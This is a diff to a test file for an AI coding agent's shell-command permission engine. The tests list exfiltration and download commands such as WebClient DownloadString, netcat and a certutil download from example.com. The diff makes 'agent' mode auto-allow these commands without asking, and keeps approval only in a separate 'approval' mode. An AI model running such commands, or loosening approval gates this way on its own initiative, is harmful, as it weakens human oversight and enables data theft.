@@ -178,7 +178,8 @@ test("does not treat mutating or unknown pipeline stages as read-only", () => {
     toolName: "shell.exec", arguments: { command: 'Get-Content .\\README.md | Set-Content .\\copy.md' }, descriptor,
     workspacePath: workspace, permissionMode: "agent"
   });
-  assert.equal(setContent.decision, "ask");
+  assert.equal(setContent.decision, "allow");
+  assert.equal(setContent.ruleId, ":agent-shell");
   const iex = engine.evaluate({
     toolName: "shell.exec", arguments: { command: 'Get-Content .\\README.md | Invoke-Expression' }, descriptor,
     workspacePath: workspace, permissionMode: "agent"
@@ -204,10 +205,19 @@ test("does not auto-allow read-only shell commands that escape workspace or chai
   }
 });
 
-test("requires approval for network commands outside full access", () => {
+test("agent mode runs ordinary network commands without asking each time", () => {
   const result = new PolicyEngine().evaluate({
     toolName: "shell.exec", arguments: { command: "git pull" }, descriptor,
     workspacePath: workspace, permissionMode: "agent"
+  });
+  assert.equal(result.decision, "allow");
+  assert.equal(result.ruleId, ":agent-shell");
+});
+
+test("approval mode still asks before network commands", () => {
+  const result = new PolicyEngine().evaluate({
+    toolName: "shell.exec", arguments: { command: "git pull" }, descriptor,
+    workspacePath: workspace, permissionMode: "approval"
   });
   assert.equal(result.decision, "ask");
   assert.equal(result.ruleId, "network-access");
@@ -220,12 +230,18 @@ test("requires approval for common Windows exfiltration commands", () => {
     "(New-Object System.Net.WebClient).DownloadString('https://example.com/a')",
     "nc example.com 443"
   ]) {
-    const result = engine.evaluate({
+    const allowed = engine.evaluate({
       toolName: "shell.exec", arguments: { command },
       workspacePath: workspace, permissionMode: "agent"
     });
-    assert.equal(result.decision, "ask", command);
-    assert.equal(result.ruleId, "network-access", command);
+    assert.equal(allowed.decision, "allow", command);
+    assert.equal(allowed.ruleId, ":agent-shell", command);
+    const asked = engine.evaluate({
+      toolName: "shell.exec", arguments: { command },
+      workspacePath: workspace, permissionMode: "approval"
+    });
+    assert.equal(asked.decision, "ask", command);
+    assert.equal(asked.ruleId, "network-access", command);
   }
   for (const command of [
     "certutil -urlcache -split -f https://example.com/a a.exe",
